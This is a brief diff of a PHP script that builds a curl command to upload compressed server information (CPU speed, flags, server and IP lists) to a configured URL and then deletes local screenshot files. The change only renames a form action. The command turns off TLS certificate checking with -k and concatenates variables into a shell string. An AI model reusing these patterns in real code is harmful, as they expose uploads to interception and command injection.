@@ -312,7 +312,7 @@ fi;\n";
 		'speed' => $speed,
 		'cpu_flags' => $flags,
 	);
-	$cmd = 'curl --connect-timeout 60 --max-time 600 -k -F action=serverlist -F servers="'.base64_encode(gzcompress(serialize($servers), 9)).'"  '
+	$cmd = 'curl --connect-timeout 60 --max-time 600 -k -F action=server_list -F servers="'.base64_encode(gzcompress(serialize($servers), 9)).'"  '
 	. (isset($ips) ? ' -F ips="'.base64_encode(gzcompress(serialize($ips), 9)).'" ' : '')
 	. $curl_cmd.' "'.$url.'" 2>/dev/null;';
 	$cmd .= '/bin/rm -f shot_*jpg shot_*jpg.gz 2>/dev/null;';
